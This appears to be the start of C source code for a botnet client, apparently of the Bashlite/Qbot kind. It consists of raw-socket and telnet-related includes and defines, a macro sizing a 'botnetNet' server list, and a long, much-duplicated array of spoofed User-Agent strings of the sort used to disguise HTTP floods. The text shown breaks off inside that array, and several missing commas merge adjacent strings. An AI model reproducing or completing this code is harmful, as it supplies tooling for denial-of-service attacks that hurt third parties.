#include <stdlib.h>
#include <stdarg.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <signal.h>
#include <strings.h>
#include <string.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <time.h>
#include <dirent.h>
#include <ctype.h>
#include <sys/prctl.h>
#define PAD_RIGHT 1
#define PAD_ZERO 2
#define PRINT_BUF_LEN 12
#define PR_SET_NAME 15
#define PHI 0x9e3779b9
#define CMD_IAC 255
#define CMD_WILL 251
#define CMD_WONT 252
#define CMD_DO 253
#define CMD_DONT 254
#define OPT_SGA 3
#define STD2_SIZE 65
#define BUFFER_SIZE 1024
#define SERVER_LIST_SIZE (sizeof(botnetNet) / sizeof(unsigned char *))

const char *UserAgents[] = {
"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Opera/9.80 (Windows NT 6.2; Win64; x64) Presto/2.12 Version/12.16",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
"PSP (PlayStation Portable); 2.00",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100"
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)"
"AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)",
"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)",
"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)",
"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)",
"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)",
"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)",
"Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)",
"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36",
"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2",
"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)",
"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7",
"Mozilla/5.0 (PLAYSTATION 3; 3.55)",
"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2",
"wii libnup/1.0",
"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)",
"PSP (PlayStation Portable); 2.00",
"Bunjalloo/0.7.6(Nintendo DS;U;en)",
"Doris/1.15 [en] (Symbian)",
"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01",
"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)",
"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0",
"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0",
"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)",
"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000",
"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)",
"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5",
"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10",
"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0",
"Opera/6.04 (Windows XP; U) [en]",
"Opera/9.99 (X11; U; sk)",
"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5",
"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc",
"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk",
"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41",
"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)",
"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15"
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0",
"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1",
"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 "
"Firefox/3.5.3",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 "
"Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) "
"Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) "
"Gecko/20090718 Firefox/3.5.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 "
"(KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; "
"SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; "
".NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR "
"3.0.30729)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; "
"Trident/4.0)",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; "
".NET CLR 2.0.50727; InfoPath.2)",
"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) "
"Chrome/41.0.2228.0 Safari/537.36",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 "
"Version/12.16",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like "
"Gecko",
"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) "
"like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 "
"(KHTML, like Gecko) Version/7.0.3 Safari/7046A194A"
"Baiduspider+(+http://www.baidu.com/search/spider.htm)",
"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/",
"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)",
"zspider/0.9-dev http://feedback.redkolibri.com/",
"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)",
"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)",
"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)",
"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)",
"TheSuBot/0.2 (www.thesubot.de)",
"TheSuBot/0.1 (www.thesubot.de)",
"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
"FAST-WebCrawler/3.x Multimedia",
"Mozilla/4.0 (compatible: FDSE robot)",
"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
